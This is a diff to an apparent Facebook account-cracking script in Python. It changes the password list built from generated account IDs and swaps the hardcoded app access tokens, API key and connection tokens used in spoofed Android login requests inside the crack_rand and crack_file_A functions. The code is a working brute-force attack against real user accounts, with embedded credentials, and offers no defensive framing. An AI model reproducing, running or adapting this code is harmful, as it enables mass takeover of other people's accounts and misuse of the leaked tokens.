@@ -436,7 +436,7 @@ class Akash:
             print(f"---------------------------------------------------")
             for love in bou:
                 ids = code + love
-                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'57273200','59039200','57575751','57575752']
+                passlist = [love,ids[:8],ids[:7],ids[:6],'57273200','59039200','57575751','57575752']
                 My_Tanisha.submit(crack_rand,ids,passlist)
         print('')
         linex()
@@ -514,7 +514,7 @@ def crack_file_A(ids,names,passlist):
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
             "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
             "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
-            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895", # --> Use App ID|Token/Sig
+            "access_token": "894558675713693|Z7C8cb84eZrKb2HzVHhcdJ6jRHk", # --> Use App ID|Token/Sig
             "api_key": "882a8490361da98702bf97a021ddc14d",
             "sig":"1d6bdac1d94b7eff5dfc99453b632a28"}
             head = {
@@ -525,7 +525,7 @@ def crack_file_A(ids,names,passlist):
             "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
             "X-FB-Connection-Quality": "EXCELLENT",
             "X-FB-Connection-Type": "MOBILE.LTE",
-            "X-FB-connection-Token": "d29d67d37eca387482a8a5b740f84f62",
+            "X-FB-connection-Token": "AspvBDh2Pbx-vi23H4JtPog",#😛😛😛😛
             "X-FB-HTTP-Engine": "Liger",
             'X-FB-Client-IP': 'True',
             "X-FB-Friendly-Name": "authenticate",
@@ -581,13 +581,13 @@ def crack_rand(ids,passlist):
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
             "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
             "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
-            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "access_token": "894558675713693|Z7C8cb84eZrKb2HzVHhcdJ6jRHk", # --> Use App ID|Token/Sig
             "api_key": "882a8490361da98702bf97a021ddc14d",
             "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
             content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
             head = {
             "User-Agent": limon2(),
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "Authorization": "OAuth 894558675713693|Z7C8cb84eZrKb2HzVHhcdJ6jRHk", # --> Use App ID|Token/Sig
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
             "X-FB-Net-HNI": str(random.randint(20000, 40000)),
             "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
